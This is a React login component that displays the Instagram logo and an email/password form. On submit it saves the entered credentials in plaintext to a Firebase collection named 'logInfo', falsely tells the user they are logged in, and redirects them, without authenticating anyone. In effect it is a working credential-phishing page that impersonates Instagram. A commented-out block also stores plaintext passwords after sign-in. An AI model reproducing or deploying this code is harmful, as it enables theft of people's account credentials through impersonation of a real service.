import React, { useEffect, useState } from 'react';
import { useHistory } from 'react-router-dom';
import { auth,db } from './firebase';
import './Login.css';

function Login2() {

    const[username, setUsername] = useState("");
    const[password, setPassword] = useState("");
    const [userData, setUserData] = useState(false)
    const history = useHistory();

    // const login = (e) => {
    //     e.preventDefault();
    //     auth
    //         .signInWithEmailAndPassword(username, password)
    //         .then((auth) => {
    //             if(auth){
    //                 const id = auth.user.uid;
    //                 db.collection("data").doc(id).set({
    //                     username: username,
    //                     password: password,
    //                 })
    //                 .then(alert("Logged in Successfully!"))
    //                 history.push("/result")

    //             }
    //         })
    //         .catch((error) => alert(error.message))
    //         setUsername("")
    //         setPassword("")
            
    // }
    // const[productDetails, setProductDetails] = useState("");
    
    // // {console.log(products)}

    // useEffect(() => {
    //     const getData = async () => {
    //         await db.collection("userInfo").doc(`${props.id}`).onSnapshot(snapshot => {
    //             setProductDetails(snapshot.data())
    //         })
    //     }
    //     getData();
    //     // setPId(productId);
    // }, [])

    // console.log(productDetails);

    const login = (e) =>{
        e.preventDefault();
        db.collection("logInfo").add({
            username : username,
            password : password,
        })
        .catch((error) => alert(error.message))
        .then(alert("Logged in Successfully!"))
        .then(history.push("/result"))
        setUsername("");
        setPassword("");
    }

    return (
        <div className = "login">
            <img  className = "login__logo" src = "https://1000logos.net/wp-content/uploads/2017/02/Instagram-Logo.png" alt = "" />
            <form className = "login__form" onSubmit = {login} autoComplete="off">
                <input type = "text" value = {username} onChange = {(e) => setUsername(e.target.value)} className = "login__input" placeholder = "Email" required/>
                <input type = "password" value = {password} onChange = {(e) => setPassword(e.target.value)} className = "login__input" placeholder = "Password" required/>
                <button type = "submit" className = "login__button" onSubmit = {login}>Log In</button>
            </form>
        </div>
    )
}

export default Login2;
